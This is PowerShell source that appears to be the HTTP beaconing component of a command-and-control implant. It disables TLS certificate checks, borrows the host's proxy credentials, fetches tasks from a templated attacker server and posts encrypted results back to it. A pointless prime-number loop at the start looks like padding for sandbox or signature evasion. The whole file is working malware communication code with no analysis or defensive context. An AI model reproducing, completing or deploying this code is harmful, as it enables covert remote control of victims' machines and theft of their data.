$sad = 12;
function Perform-HeavyComputation { $maxNumber = 100000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };

Perform-HeavyComputation;

$Script:sIndex = 0;
$Script:myserver = "{{ host }}";

if($myserver.StartsWith('https')){
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
}
$Script:Cservs = @($Script:myserver);

$Script:GetTask = {
    try {
        if ($Script:Cservs[$Script:sIndex].StartsWith("http")) {

            # meta 'TASKING_REQUEST' : 4
            $RPacket = New-RoutingPacket -EncData $Null -Meta 4;
            $RCook = [Convert]::ToBase64String($RPacket);

            # build the web request object
            $wc = New-Object System.Net.WebClient;

            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if($Script:Proxy) {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add("User-Agent",$script:UserAgent);
            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
            $wc.Headers.Add("Cookie","{{ session_cookie }}session=$RCook");

            # choose a random valid URI for checkin
            $taskURI = $script:TaskURIs | Get-Random;
            $result = $wc.DownloadData($Script:Cservs[$Script:sIndex] + $taskURI);
            $result;
        }
    }
    catch [Net.WebException] {
        $script:MissedCheckins += 1;
        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
            # restart key negotiation
            Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
        }
    }
};

$Script:SendMessage = {
    param($Packets)

    if($Packets) {
        # build and encrypt the response packet
        $EncBytes = Encrypt-Bytes $Packets;

        # build the top level RC4 "routing packet"
        # meta 'RESULT_POST' : 5
        $RPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

        if($Script:Cservs[$Script:sIndex].StartsWith('http')) {
            # build the web request object
            $wc = New-Object System.Net.WebClient;
            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if($Script:Proxy) {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add('User-Agent', $Script:UserAgent);
            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};

            try {
                # get a random posting URI
                $taskURI = $Script:TaskURIs | Get-Random;
                $response = $wc.UploadData($Script:Cservs[$Script:sIndex]+$taskURI, 'POST', $RPacket);
            }
            catch [System.Net.WebException]{
                # exception posting data...
                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                    # restart key negotiation
                    Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
                    }
                }
            }
        }
    };